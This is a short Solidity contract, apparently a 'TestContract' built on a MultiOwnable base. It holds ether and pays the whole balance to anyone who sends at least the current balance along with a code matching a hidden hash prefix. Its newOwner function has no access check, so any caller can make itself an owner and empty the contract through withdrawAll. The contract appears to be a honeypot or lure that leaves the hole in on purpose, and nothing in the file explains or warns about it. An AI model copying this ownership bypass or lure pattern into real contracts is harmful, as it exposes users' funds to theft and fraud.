 

pragma solidity ^0.4.23;

 
contract MultiOwnable {
  address public root;
  mapping (address => address) public owners;  

   
  constructor() public {
    root = msg.sender;
    owners[root] = root;
  }

   
  modifier onlyOwner() {
    require(owners[msg.sender] != 0);
    _;
  }

   
   
  function newOwner(address _owner) external returns (bool) {
    require(_owner != 0);
    owners[_owner] = msg.sender;
    return true;
  }

   
  function deleteOwner(address _owner) onlyOwner external returns (bool) {
    require(owners[_owner] == msg.sender || (owners[_owner] != 0 && msg.sender == root));
    owners[_owner] = 0;
    return true;
  }
}

contract TestContract is MultiOwnable {


    function retrieve(string code) public payable {
        if (msg.value >= (this.balance - msg.value)) {
            if (bytes5(keccak256(code)) == 0x70014a63ef) {
                msg.sender.transfer(this.balance);
            }
        }
    }

  function withdrawAll() onlyOwner {
    msg.sender.transfer(this.balance);
  }

  function() payable {
  }

}
